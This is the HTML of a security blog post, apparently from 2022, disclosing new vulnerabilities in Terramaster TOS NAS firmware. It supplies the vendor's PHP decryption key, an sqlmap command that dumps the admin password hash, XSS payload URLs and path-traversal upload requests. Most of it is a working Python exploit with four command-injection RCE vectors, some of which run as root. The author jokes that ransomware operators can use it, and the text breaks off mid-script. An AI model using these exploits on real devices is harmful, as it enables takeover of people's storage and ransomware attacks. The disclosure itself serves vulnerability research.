@@ -1,0 +1,651 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="n0tme ">
+<meta name="description" content="Hi folks! I recently read about a few vulnerabilities on Terramaster which were ~basically stolen from me~ heavily inspired by my previous ones, so I decided to look into Terramaster again, just to find a few more. Ah.
+This time I didn&amp;rsquo;t spend much time reasearching, and I couldn&amp;rsquo;t find an auth bypass so you will need valid credentials to reach the RCEs. Don&amp;rsquo;t worry tho, you ransomware operators can still get the admin hashes and username." />
+<meta name="keywords" content=", 5, 0day, terramaster, rce, sqli" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="/posts/2022/03/all-you-can-pwn-buffet/" />
+
+
+    <title>
+        
+            All you can PWN buffet :: thatsn0tmysite  — The life of a newbor cyber security kid.
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.559c11c353d977c72bfa364708d81343a35654a99d1d1249c7e2e9210afb111e.css">
+
+
+
+
+
+
+<meta itemprop="name" content="All you can PWN buffet">
+<meta itemprop="description" content="Hi folks! I recently read about a few vulnerabilities on Terramaster which were ~basically stolen from me~ heavily inspired by my previous ones, so I decided to look into Terramaster again, just to find a few more. Ah.
+This time I didn&rsquo;t spend much time reasearching, and I couldn&rsquo;t find an auth bypass so you will need valid credentials to reach the RCEs. Don&rsquo;t worry tho, you ransomware operators can still get the admin hashes and username."><meta itemprop="datePublished" content="2022-03-13T05:57:57+01:00" />
+<meta itemprop="dateModified" content="2022-03-13T05:57:57+01:00" />
+<meta itemprop="wordCount" content="1873">
+<meta itemprop="keywords" content="5,0day,terramaster,rce,sqli," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="All you can PWN buffet"/>
+<meta name="twitter:description" content="Hi folks! I recently read about a few vulnerabilities on Terramaster which were ~basically stolen from me~ heavily inspired by my previous ones, so I decided to look into Terramaster again, just to find a few more. Ah.
+This time I didn&rsquo;t spend much time reasearching, and I couldn&rsquo;t find an auth bypass so you will need valid credentials to reach the RCEs. Don&rsquo;t worry tho, you ransomware operators can still get the admin hashes and username."/>
+
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2022-03-13 05:57:57 &#43;0100 CET" />
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">thatsn0tmysite</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/about/">About</a></li><li><a href="/posts/">Blog</a></li><li><a href="/projects/">Projects</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        9 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="/posts/2022/03/all-you-can-pwn-buffet/">All you can PWN buffet</a>
+      </h1>
+
+      
+
+      
+
+      
+
+      <div class="post-content">
+        <p>Hi folks!
+I recently read about a <a href="https://thehackernews.com/2022/03/critical-bugs-in-terramaster-tos-could.html">few vulnerabilities</a> on Terramaster which were ~basically stolen from me~ heavily inspired by my previous ones, so I decided to look into Terramaster again, just to find a few more. Ah.</p>
+<p>This time I didn&rsquo;t spend much time reasearching, and I couldn&rsquo;t find an auth bypass so you will need valid credentials to reach the RCEs. Don&rsquo;t worry tho, you ransomware operators can still get the admin hashes and username. Some ~assembly~ hashcat required.</p>
+<p>Speaking of ransomware,about the impact the last exploit I published got on the devices, I am sorry for everyone who got their stuff locked by deadbolt. I tried to get in touch with Terramaster, they never replied to me.</p>
+<p>Yet, I persisted and this time I made another attempt at getting in touch with the developers - once more I got ghosted.
+As always if in a hurry just get the code form <a href="https://gist.github.com/thatsn0tmysite/fca704a47248722590ccd9cc6304cb75">here</a>.</p>
+<h2 id="the-menu">The menu</h2>
+<p>On today&rsquo;s menu we have:</p>
+<ul>
+<li>4 new flavours of RCEs</li>
+<li>8 flavours of XSS</li>
+<li>1 double blind SQLi</li>
+<li>1 info disclosure</li>
+</ul>
+<p>but before moving to the juicy parts, let&rsquo;s start from the beginning, again.</p>
+<h2 id="decrypt">Decrypt</h2>
+<p>This time the developers put a litte more effort (very little) into encrypting their PHP files.
+Also, cracking it, made me feel like a terrible person: the key literally asked me to stop poking around their product. <strong>I do have a heart, I swear&hellip;</strong></p>
+<p>After me and <a href="https://matrix.to/#/@bloodyshell:matrix.org">@bloodyshell</a> found out about the update, before I could even download the file, <a href="https://matrix.to/#/@bloodyshell:matrix.org">@bloodyshell</a> already reversed the key generation algorithm.</p>
+<pre tabindex="0"><code>It's not easy to develop software,please don't crack it please keep it secret
+</code></pre><p>And they are absolutely right, it is not easy to develop software, but that is not an excuse to not perform security audits or accurate code review. I hope I will eventually reach out to the developers to explain this better.</p>
+<p>Anyway, this time the key itself was begging me not to crack their code again. I obviously couldn&rsquo;t resist (<strong>&hellip;or maybe I don&rsquo;t, after all.</strong>):</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#6ab825;font-weight:bold">void</span> <span style="color:#447fcf">FUN_001016b0</span>(<span style="color:#6ab825;font-weight:bold">long</span> param_1)
+{
+  ulong uVar1;
+  <span style="color:#6ab825;font-weight:bold">char</span> cVar2;
+  
+  uVar1 = <span style="color:#3677a9">0</span>;
+  <span style="color:#6ab825;font-weight:bold">do</span> {
+    <span style="color:#6ab825;font-weight:bold">if</span> ((uVar1 &amp; <span style="color:#3677a9">1</span>) == <span style="color:#3677a9">0</span>) {
+      cVar2 = s_It<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>s0not2easy3to4develop6softwar_001143b0[uVar1];
+    }
+    <span style="color:#6ab825;font-weight:bold">else</span> {
+      cVar2 = s_It<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>s0not2easy3to4develop6softwar_001143b0[uVar1 * <span style="color:#3677a9">2</span>];
+    }
+    *(<span style="color:#6ab825;font-weight:bold">char</span> *)(param_1 + uVar1) = cVar2;
+    uVar1 = uVar1 + <span style="color:#3677a9">1</span>;
+  } <span style="color:#6ab825;font-weight:bold">while</span> (uVar1 != <span style="color:#3677a9">0x20</span>);
+  <span style="color:#6ab825;font-weight:bold">return</span>;
+}
+</code></pre></div><p>To rebuild the key, just do the same as above with some python:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3">&gt;&gt;&gt; s=<span style="color:#ed9d13">&#34;&#34;&#34;It&#39;s0not2easy3to4develop6software,5please7don&#39;t9crack8it6please9keep7it3secretIt&#39;s0not2easy3to4develop6software,5please7don&#39;t9crack8it6please9keep7it3secret&#34;It&#39;s0not2easy3to4develop6software,5please7don&#39;t9crack8it6please9keep7it3secretIt&#39;s0not2easy3to4develop6software,5please7don&#39;t9crack8it6please9keep7it3sec
+</span><span style="color:#ed9d13">ret&#34;&#34;&#34;</span>
+&gt;&gt;&gt; <span style="color:#24909d">len</span>(s)
+<span style="color:#3677a9">313</span>
+&gt;&gt;&gt; <span style="color:#ed9d13">&#39;&#39;</span>.join([s[i] <span style="color:#6ab825;font-weight:bold">if</span> (i % <span style="color:#3677a9">2</span>) == <span style="color:#3677a9">0</span> <span style="color:#6ab825;font-weight:bold">else</span> s[i*<span style="color:#3677a9">2</span>] <span style="color:#6ab825;font-weight:bold">for</span> i <span style="color:#6ab825;font-weight:bold">in</span> <span style="color:#24909d">range</span>(<span style="color:#3677a9">32</span>)])
+<span style="color:#ed9d13">&#34;I&#39;&#39;o0aot2eaoyota45eaedot6aoitlae&#34;</span>
+</code></pre></div><p>Conclusion? Even after I <strong>highly suggested</strong> not to focus on protecting the PHP code from view, but on securing its bugs first, no real patch was addressed for the RCEs which still appear to be there.</p>
+<p>Anyway, the new key is: <code>I''o0aot2eaoyota45eaedot6aoitlae</code>. You can reuse the <a href="https://gist.github.com/thatsn0tmysite/c20602289d2cdc9ab7484851eefd92ba">unscerw script</a> from last time. Just change the key.</p>
+<p>Security through obscurity is never a good idea. Sorry guys.</p>
+<p>Also I noticed that the whole UI is taken from this GPLv3 licensed application: <a href="https://github.com/kalcaddle/KodExplorer">github.com/kalcaddle/KodExplorer</a> and somebody forgot to include it in their open source licensed softwares (or I couldn&rsquo;t find it from a quick glance in their provided source files):</p>
+<pre tabindex="0"><code>https://www.terra-master.com/it/gplsource/
+</code></pre><h2 id="vulns-vulns-everywhere">Vulns, vulns everywhere.</h2>
+<h3 id="still-too-much-info-pal">Still too much info, pal.</h3>
+<p>Since the old APIs are now &ldquo;protected&rdquo; from unauthorized users, I had to find a new info disclosure.
+To achieve this we simply send any malformed request to:</p>
+<pre tabindex="0"><code>http://nas.ip:8181/v1/SessionEvents/update
+</code></pre><p>This time we only get back a couple information about php, the webserver and&hellip; the username of the <code>admin</code> user.</p>
+<ul>
+<li>~Get admin user~ DONE.</li>
+</ul>
+<p>Also, it is worthy to notice that the update procedure does not seem to delete old files, after upgrading I still had the <code>m1.php</code> and <code>m2.php</code> files.
+This still leaves the app vulnerable to the MAC address disclosure discussed in the <a href="https://thatsn0tmy.site/posts/2021/12/how-to-summon-rces/">previous blogpost</a>.</p>
+<h3 id="sqli">SQLi</h3>
+<p>Since this time we didn&rsquo;t get the admin hash back, I looked for other ways to get it.
+Turns out one can just get the password hash from the database using a double blind SQLi in the login form. <strong>Unauthenticated</strong>. So old school.</p>
+<p>The vulnerable parameter is the <code>name</code> field in the query string inside the <code>user.class.php::loginSubmit</code> function.</p>
+<p>I optimized the sqlmap command as much as I could, modify as needed:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#ed9d13">&#34;http://nas.ip/tos/index.php?user/loginSubmit&amp;name=sqli&amp;password=n0t&amp;platform=me&#34;</span> --dbms=sqlite --level=<span style="color:#3677a9">5</span> --risk=<span style="color:#3677a9">2</span> --technique=t -p name -T user_table -C password --dump --time-sec {args.sqlmap_time} --where <span style="color:#ed9d13">&#34;username=</span><span style="color:#6ab825;font-weight:bold">$(</span><span style="color:#24909d">printf</span> <span style="color:#40ffff">$ADMIN</span> | base64<span style="color:#6ab825;font-weight:bold">)</span><span style="color:#ed9d13">&#34;</span>
+</code></pre></div><p>Obviously replace $ADMIN with the username of the administrator from the previous step.</p>
+<p>This takes a little time, but not too long, so go grab a coffee and wait ~for the new ransomware wave~. This joke is not as funny now that it actually happened - is it? You can&rsquo;t say I did not warn you though.</p>
+<ul>
+<li>~Get the admin hash~ DONE.</li>
+</ul>
+<h3 id="rces">RCEs</h3>
+<p>As usual, it has not been very difficult to pwn TOS, using the <a href="https://thatsn0tmy.site/posts/2021/12/how-to-summon-rces/">previously mentioned technique</a> of grepping for <code>shell</code>.</p>
+<p>As for the RCEs, same ol&rsquo;story, user input <strong>still</strong> doesn&rsquo;t get validated in many places, or gets validated poorly (seriously, get a <a href="https://www.php.net/manual/en/function.escapeshellcmd.php">hint</a> or <a href="https://www.php.net/manual/en/function.escapeshellarg.php">two</a>).</p>
+<p>They are all pretty obvious in the exploit.</p>
+<ul>
+<li>~PWN~ DONE.</li>
+</ul>
+<h3 id="xss-galore">XSS galore</h3>
+<p>Basically all parameters used in these pages are vulnerable, in case you needed a reminder that <code>echo $_GET['whatever'];</code> is always a bad idea:</p>
+<pre tabindex="0"><code>http://nas.ip:8181/3.0/template/share/edit.php?user=%22%20onerror=alert(1)%3Ealert(1);//%3C/script%3E
+
+http://nas.ip:8181/3.0/template/share/editor.php?user=%22%20onerror=alert(1)%3Ealert(1);//%3C/script%3E
+
+http://nas.ip:8181/3.0/template/share/explorer.php?user=%22%20onerror=alert(1)%3Ealert(1);//%3C/script%3E
+
+http://nas.ip:8181/3.0/template/share/file.php?user=%22%20onerror=alert(1)%3Ealert(1);//%3C/script%3E
+
+http://nas.ip:8181/3.0/template/share/tips.php?user=%22%20onerror=alert(1)%3Ealert(1);//%3C/script%3E
+
+http://nas.ip:8181/3.0/template/user/login-preview.php?q9=&lt;script&gt;alert(1)&lt;/script&gt;
+
+http://nas.ip:8181/module/index.php?mod=Portainer&amp;t=aaaaaaaaaa%22;alert(1);var%20x=%22
+
+http://nas.ip:8181/tos/index.php?share/folder&amp;sid=a&amp;user=a%22%3E%3C/script%3E%3Cimg%20src=x%20onerror=alert(1)%3E&amp;path=/
+</code></pre><h3 id="misc">Misc</h3>
+<p>After the main dish, if you are interested there are a few more gotchas:</p>
+<ul>
+<li>All downloads from the store happen over HTTP, not HTTPS. A random example is: <code>http://dl.terra-master.com/cn/RTK7.0CJ/Tomcat_TOS_APP_1.2.1_aarch64.tpk</code></li>
+<li>I could count at least one more hardcoded key in the application, which is found in the Mcrypt class: <code>a!takA:dlmcldEv,e</code>. Used when Mcrypt gets called without a key parameter.</li>
+<li>I found a couple path traversal, but I was too lazy to see if they could be properly weaponized, notes are below, enjoy:</li>
+</ul>
+<pre tabindex="0"><code>POST http://nas.ip:8181/include/ajax/ajaxdata.php HTTP/1.1
+Host: nas.ip:8181
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: multipart/form-data; boundary=---------------------------272557087831800767091975222786
+Content-Length: 515
+Origin: http://nas.ip:8181
+Connection: keep-alive
+Referer: http://nas.ip:8181/tos/index.php?setting
+Cookie: PHPSESSID=d4ccdee5a084ad3a4534ba5982ca9db1; tos_visit_time=1646086250; kod_name=admin; noshow=1
+Upgrade-Insecure-Requests: 1
+
+-----------------------------272557087831800767091975222786
+Content-Disposition: form-data; name=&quot;uploaddir&quot;
+
+../../../../../../../../tmp
+-----------------------------272557087831800767091975222786
+Content-Disposition: form-data; name=&quot;sysbakfunction&quot;
+
+13
+-----------------------------272557087831800767091975222786
+Content-Disposition: form-data; name=&quot;filename&quot;; filename=&quot;allyourbase.jpg&quot;
+Content-Type: image/jpeg
+
+&lt;?php phpinfo(); ?&gt;
+-----------------------------272557087831800767091975222786--
+</code></pre><pre tabindex="0"><code>POST http://nas.ip:8181/include/ajax/ajaxdata.php HTTP/1.1
+Host: nas.ip:8181
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: multipart/form-data; boundary=---------------------------272557087831800767091975222786
+Content-Length: 515
+Origin: http://nas.ip:8181
+Connection: keep-alive
+Referer: http://nas.ip:8181/tos/index.php?setting
+Cookie: PHPSESSID=d4ccdee5a084ad3a4534ba5982ca9db1; tos_visit_time=1646086250; kod_name=admin; noshow=1
+Upgrade-Insecure-Requests: 1
+
+-----------------------------272557087831800767091975222786
+Content-Disposition: form-data; name=&quot;uploaddir&quot;
+
+../../../../../../usr/www
+-----------------------------272557087831800767091975222786
+Content-Disposition: form-data; name=&quot;sysbakfunction&quot;
+
+2
+-----------------------------272557087831800767091975222786
+Content-Disposition: form-data; name=&quot;filename&quot;; filename=&quot;allyourbase.jpg&quot;
+Content-Type: image/jpeg
+
+&lt;?php phpinfo(); ?&gt;
+-----------------------------272557087831800767091975222786--
+</code></pre><h2 id="destroy">Destroy</h2>
+<p>Once again, we can chain some of the vulns to get to an RCE, sadly this time it requires a tiny bit of effort.</p>
+<p>We first run the script to get a user&rsquo;s hash, then crack it with your favorite cracking too, then launch the script again giving the hash and credentials.</p>
+<p>By default the script attempts to grab the admin&rsquo;s hash if no user is specified. Enjoy:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#999;font-style:italic">#!/bin/env python3</span>
+
+<span style="color:#999;font-style:italic">#Title: Terramaster TOS Time based SQLi &amp; Multiple RCEs</span>
+<span style="color:#999;font-style:italic">#Author: n0tme (thatsn0tmysite)</span>
+<span style="color:#999;font-style:italic">#TOS version: 4.2.28-2201201720, 4.2.30-2203011629</span>
+
+<span style="color:#6ab825;font-weight:bold">from</span> <span style="color:#447fcf;text-decoration:underline">pydoc</span> <span style="color:#6ab825;font-weight:bold">import</span> describe
+<span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">requests</span>
+<span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">shutil</span>, <span style="color:#447fcf;text-decoration:underline">os</span>, <span style="color:#447fcf;text-decoration:underline">time</span>
+<span style="color:#6ab825;font-weight:bold">from</span> <span style="color:#447fcf;text-decoration:underline">argparse</span> <span style="color:#6ab825;font-weight:bold">import</span> ArgumentParser
+<span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">urllib3</span>
+<span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">base64</span>, <span style="color:#447fcf;text-decoration:underline">hashlib</span>, <span style="color:#447fcf;text-decoration:underline">re</span>
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+USER=<span style="color:#ed9d13">&#34;&#34;</span>
+PASS=<span style="color:#ed9d13">&#34;&#34;</span>
+B64USER=<span style="color:#ed9d13">&#34;&#34;</span>
+TARGET=<span style="color:#ed9d13">&#34;&#34;</span>
+MAC_ADDRESS=<span style="color:#ed9d13">&#34;&#34;</span>
+RE=re.compile(<span style="color:#ed9d13">r</span><span style="color:#ed9d13">&#39;(?:[0-9a-fA-F]:?)</span><span style="color:#ed9d13">{12}</span><span style="color:#ed9d13">&#39;</span>)
+
+<span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">tos_encrypt_str</span>(toencrypt):
+    key = MAC_ADDRESS[<span style="color:#3677a9">6</span>:] 
+    <span style="color:#6ab825;font-weight:bold">return</span> hashlib.md5(<span style="color:#ed9d13">f</span><span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">{</span>key<span style="color:#ed9d13">}{</span>toencrypt<span style="color:#ed9d13">}</span><span style="color:#ed9d13">&#34;</span>.encode(<span style="color:#ed9d13">&#34;utf8&#34;</span>)).hexdigest()
+
+<span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">get_session</span>(use_proxy):
+    s=requests.Session()
+    <span style="color:#6ab825;font-weight:bold">if</span> use_proxy <span style="color:#6ab825;font-weight:bold">is</span> <span style="color:#6ab825;font-weight:bold">not</span> <span style="color:#6ab825;font-weight:bold">None</span>:
+        s.proxies = {<span style="color:#ed9d13">&#34;http&#34;</span>:use_proxy, <span style="color:#ed9d13">&#34;https&#34;</span>: use_proxy}
+    <span style="color:#6ab825;font-weight:bold">return</span> s
+
+<span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">user_session</span>(s, username, password_hash):
+    s.cookies.clear()
+    cookies = {<span style="color:#ed9d13">&#34;kod_name&#34;</span>:username, <span style="color:#ed9d13">&#34;kod_token&#34;</span>:tos_encrypt_str(password_hash), <span style="color:#ed9d13">&#34;tos_token&#34;</span>:<span style="color:#6ab825;font-weight:bold">None</span>}
+    timestamp=<span style="color:#24909d">str</span>(<span style="color:#24909d">int</span>(time.time()))
+    s.headers.update({<span style="color:#ed9d13">&#34;signature&#34;</span>: tos_encrypt_str(timestamp), <span style="color:#ed9d13">&#34;timestamp&#34;</span>: timestamp})
+    s.headers.update({<span style="color:#ed9d13">&#34;User-device&#34;</span>: <span style="color:#ed9d13">&#34;TNAS&#34;</span>})
+    s.headers.update({<span style="color:#ed9d13">&#34;User-agent&#34;</span>: <span style="color:#ed9d13">&#34;TNAS&#34;</span>})
+    <span style="color:#6ab825;font-weight:bold">for</span> name,value <span style="color:#6ab825;font-weight:bold">in</span> cookies.items():
+        s.cookies[name] = value
+
+<span style="color:#6ab825;font-weight:bold">def</span> <span style="color:#447fcf">exploit</span>(s, username, password_hash, rce, command):
+    user_session(s, USER, password_hash)
+    s.headers.update({<span style="color:#ed9d13">&#34;authorization&#34;</span>: hashlib.sha256(password_hash.encode(<span style="color:#ed9d13">&#34;ascii&#34;</span>)).hexdigest()})
+    
+    <span style="color:#6ab825;font-weight:bold">if</span> rce == <span style="color:#3677a9">2</span>:
+        s.headers.update({<span style="color:#ed9d13">&#34;authorization&#34;</span>: password_hash})
+    <span style="color:#24909d">print</span>(<span style="color:#ed9d13">&#34;[*] Session info:&#34;</span>)
+    <span style="color:#6ab825;font-weight:bold">for</span> k,v <span style="color:#6ab825;font-weight:bold">in</span> s.headers.items():
+        <span style="color:#24909d">print</span>(<span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\t</span><span style="color:#ed9d13">&#34;</span>+k+<span style="color:#ed9d13">&#34;: &#34;</span>+v)
+    <span style="color:#24909d">print</span>(<span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\t</span><span style="color:#ed9d13">&#34;</span>+<span style="color:#ed9d13">&#34;Cookie: &#34;</span>, end=<span style="color:#ed9d13">&#34;&#34;</span>)
+    <span style="color:#6ab825;font-weight:bold">for</span> k,v <span style="color:#6ab825;font-weight:bold">in</span> s.cookies.items():
+        <span style="color:#24909d">print</span>(k+<span style="color:#ed9d13">&#34;: &#34;</span>+v+<span style="color:#ed9d13">&#34;; &#34;</span>,end=<span style="color:#ed9d13">&#34;&#34;</span>)
+    <span style="color:#24909d">print</span>()
+ 
+    <span style="color:#24909d">print</span>(<span style="color:#ed9d13">&#34;[*] Logging in... &#34;</span>,end=<span style="color:#ed9d13">&#34;&#34;</span>)
+    r=s.get(<span style="color:#ed9d13">f</span><span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">{</span>TARGET<span style="color:#ed9d13">}</span><span style="color:#ed9d13">/module/api.php?mobile/login&amp;username=</span><span style="color:#ed9d13">{</span>USER<span style="color:#ed9d13">}</span><span style="color:#ed9d13">&amp;password=</span><span style="color:#ed9d13">{</span>PASS<span style="color:#ed9d13">}</span><span style="color:#ed9d13">&#34;</span>)
+    result=r.json()[<span style="color:#ed9d13">&#34;msg&#34;</span>]
+    <span style="color:#24909d">print</span>(result)
+    <span style="color:#6ab825;font-weight:bold">if</span> result != <span style="color:#ed9d13">&#34;login successful&#34;</span>:
+        <span style="color:#24909d">print</span>(<span style="color:#ed9d13">&#34;[!] Login failed.&#34;</span>)
+        exit(<span style="color:#3677a9">1</span>)
+
+    <span style="color:#999;font-style:italic">#RCEs</span>
+    RCEs = [
+        <span style="color:#999;font-style:italic">#HASH is not really required for the first 2, but i was too lazy...</span>
+        <span style="color:#ed9d13">f</span><span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">{</span>TARGET<span style="color:#ed9d13">}</span><span style="color:#ed9d13">/tos/index.php?explorer/serverDownload&amp;type=download&amp;save_path=%5C&amp;url=&#39;;</span><span style="color:#ed9d13">{</span>command<span style="color:#ed9d13">}</span><span style="color:#ed9d13">;&#39;&amp;_&#34;</span>,  <span style="color:#999;font-style:italic">#NEEDS USER  CREDS -&gt; runs as user</span>
+        <span style="color:#ed9d13">f</span><span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">{</span>TARGET<span style="color:#ed9d13">}</span><span style="color:#ed9d13">/include/ajax/ajaxdata.php?mysqlfunction=1&amp;password=%7C%7C%20</span><span style="color:#ed9d13">{</span>command<span style="color:#ed9d13">}</span><span style="color:#ed9d13">&#34;</span>,                  <span style="color:#999;font-style:italic">#NEEDS ADMIN CREDS -&gt; runs as root</span>
+
+        <span style="color:#999;font-style:italic">#REQUIRE MAC ADDRESS AND CREDENTIALS</span>
+        <span style="color:#ed9d13">f</span><span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">{</span>TARGET<span style="color:#ed9d13">}</span><span style="color:#ed9d13">/module/api.php?wap/serverstatus&amp;servername=&#39;;</span><span style="color:#ed9d13">{</span>command<span style="color:#ed9d13">}</span><span style="color:#ed9d13">;&#39;&#34;</span>,                               <span style="color:#999;font-style:italic">#NEEDS USER CREDS, ADMIN HASH -&gt; runs as root</span>
+        <span style="color:#ed9d13">f</span><span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">{</span>TARGET<span style="color:#ed9d13">}</span><span style="color:#ed9d13">/module/api.php?mobile/stopTranscode&amp;md5name=&#39;;</span><span style="color:#ed9d13">{</span>command<span style="color:#ed9d13">}</span><span style="color:#ed9d13">;&#39;&#34;</span>                               <span style="color:#999;font-style:italic">#NEEDS USER CREDS, USER HASH -&gt; runs as root</span>
+    ]
+    <span style="color:#24909d">print</span>(<span style="color:#ed9d13">f</span><span style="color:#ed9d13">&#34;[~] Using: </span><span style="color:#ed9d13">{</span>RCEs[rce]<span style="color:#ed9d13">}</span><span style="color:#ed9d13">&#34;</span>)
+
+    r=s.get(RCEs[rce])
+    <span style="color:#24909d">print</span>(r.text)
+
+<span style="color:#6ab825;font-weight:bold">if</span> __name__ == <span style="color:#ed9d13">&#34;__main__&#34;</span>:
+    <span style="color:#999;font-style:italic">#CHANGE EXPLOIT TO EITHER GET THE HASH OR LOGIN AND EXECUTE COMMANDS VIA RCEs, also eleveate privileges via other vectors for sqli</span>
+    meow=<span style="color:#ed9d13">&#34;  ^ ^</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13"> (-.-) ...copycats...</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">~( ||)&#34;</span>
+
+    parser = ArgumentParser()
+    parser.add_argument(<span style="color:#ed9d13">&#34;target&#34;</span>, help=<span style="color:#ed9d13">&#34;Target to exploit&#34;</span>)
+    parser.add_argument(<span style="color:#ed9d13">&#34;-c&#34;</span>, <span style="color:#ed9d13">&#34;--cmd&#34;</span>, action=<span style="color:#ed9d13">&#34;store&#34;</span>, default=<span style="color:#ed9d13">&#34;id&#34;</span>, help=<span style="color:#ed9d13">&#34;Command to run&#34;</span>)
+    parser.add_argument(<span style="color:#ed9d13">&#34;-u&#34;</span>, <span style="color:#ed9d13">&#34;--username&#34;</span>, action=<span style="color:#ed9d13">&#34;store&#34;</span>, default=<span style="color:#6ab825;font-weight:bold">None</span>, help=<span style="color:#ed9d13">&#34;Username to log in with&#34;</span>)
+    parser.add_argument(<span style="color:#ed9d13">&#34;-p&#34;</span>, <span style="color:#ed9d13">&#34;--password&#34;</span>, action=<span style="color:#ed9d13">&#34;store&#34;</span>, default=<span style="color:#6ab825;font-weight:bold">None</span>, help=<span style="color:#ed9d13">&#34;Password to log in with&#34;</span>)
+    parser.add_argument(<span style="color:#ed9d13">&#34;-g&#34;</span>,<span style="color:#ed9d13">&#34;--get-hash&#34;</span>, action=<span style="color:#ed9d13">&#34;store_true&#34;</span>, default=<span style="color:#6ab825;font-weight:bold">None</span>, help=<span style="color:#ed9d13">&#34;Retrieve hash and quit (if no --username specified, attempts to grab USER&#39;s hash)&#34;</span>)
+    parser.add_argument(<span style="color:#ed9d13">&#34;-H&#34;</span>, <span style="color:#ed9d13">&#34;--hash&#34;</span>, action=<span style="color:#ed9d13">&#34;store&#34;</span>, default=<span style="color:#6ab825;font-weight:bold">None</span>, help=<span style="color:#ed9d13">&#34;Retrieved hash&#34;</span>)
+
+    parser.add_argument(<span style="color:#ed9d13">&#34;--rce&#34;</span>, action=<span style="color:#ed9d13">&#34;store&#34;</span>, <span style="color:#24909d">type</span>=<span style="color:#24909d">int</span>, default=<span style="color:#3677a9">1</span>, help=<span style="color:#ed9d13">&#34;RCE to use (--list for info)&#34;</span>)
+    parser.add_argument(<span style="color:#ed9d13">&#34;--list&#34;</span>, action=<span style="color:#ed9d13">&#34;store_true&#34;</span>, default=<span style="color:#6ab825;font-weight:bold">False</span>, help=<span style="color:#ed9d13">&#34;List available RCEs and info&#34;</span>)
+    parser.add_argument(<span style="color:#ed9d13">&#34;--proxy&#34;</span>, action=<span style="color:#ed9d13">&#34;store&#34;</span>, default=<span style="color:#6ab825;font-weight:bold">None</span>, help=<span style="color:#ed9d13">&#34;Proxy address to use (e.g. http://localhost:8080)&#34;</span>)
+
+    parser.add_argument(<span style="color:#ed9d13">&#34;--sqlmap-path&#34;</span>, action=<span style="color:#ed9d13">&#34;store&#34;</span>, default=shutil.which(<span style="color:#ed9d13">&#34;sqlmap&#34;</span>), help=<span style="color:#ed9d13">&#34;Path to sqlmap&#34;</span>)
